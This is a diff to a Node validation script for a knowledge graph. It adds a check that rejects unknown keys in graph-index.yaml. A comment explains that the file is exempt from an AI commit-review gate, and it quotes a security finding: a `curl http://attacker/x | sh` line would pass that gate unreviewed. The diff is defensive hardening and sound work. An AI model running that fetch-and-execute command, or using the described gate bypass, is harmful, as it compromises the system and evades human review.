@@ -1,5 +1,7 @@
 #!/usr/bin/env node
-// validate-graph.js — Checks 7 graph invariants for the knowledge graph
+// validate-graph.js — Checks structural + schema invariants for the knowledge graph
+// (unnumbered on purpose: a hardcoded count in this file's own header is the exact stale-
+//  count bug lib/readme-counts.js exists to catch. The summary line counts PASS + FAIL.)
 // Replaces validate-graph.sh (bash version took 5+ min on Windows due to subprocess overhead)
 // Run: node validate-graph.js
 // Exits non-zero on any failure
@@ -10,6 +12,7 @@ import path from 'path';
 import yaml from 'js-yaml';
 import { fileURLToPath } from 'url';
 import { readmeScanner } from './lib/readme-counts.js';
+import { unknownKeys, ALLOWED_TOP_KEYS, ALLOWED_NODE_KEYS } from './lib/schema-keys.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
@@ -174,6 +177,31 @@ if (brokenLinks.length === 0) {
   pass('No broken wikilinks in insight prose');
 } else {
   fail(`Broken wikilinks:\n${brokenLinks.join('\n')}`);
+}
+
+// --- Check 8: Closed key set (security — keeps this file OFF the exec surface) ---
+// ~/.claude/skills/review/scripts/classify-diff.js exempts graph-index.yaml from the
+// commit gate's YAML orchestration net, on the stated ground that "the schema has no
+// exec surface to grow". Until 2026-08-22 nothing enforced that: a security review
+// showed `run: curl http://attacker/x | sh` appended at TOP LEVEL classified inert,
+// i.e. committable with zero reviewers. This check is that enforcement — it is the
+// only thing standing between a new directive key and a silent gate bypass, so if it
+// fails, FIX THE KEY, never widen the set. Widening means first pulling the entry
+// from DATA_YAML_PATHS.
+//
+// Logic lives in lib/schema-keys.js so it is unit-testable (tests/schema-keys.test.ts) —
+// same extraction rationale as lib/readme-counts.js.
+const unknown = unknownKeys(graphIndex);
+
+if (unknown.length === 0) {
+  pass(`Closed schema: no unknown keys or nested mappings in graph-index.yaml (${ALLOWED_TOP_KEYS.length} top-level, ${ALLOWED_NODE_KEYS.length} per-node)`);
+} else {
+  fail(
+    `Unknown keys in graph-index.yaml — this file is EXEMPT from the review gate, so an\n` +
+    `unrecognised key is a potential silent bypass. Fix the key, or pull graph-index.yaml\n` +
+    `from DATA_YAML_PATHS in ~/.claude/skills/review/scripts/classify-diff.js first:\n` +
+    unknown.map(u => `  ${u}`).join('\n')
+  );
 }
 
 // --- Summary ---
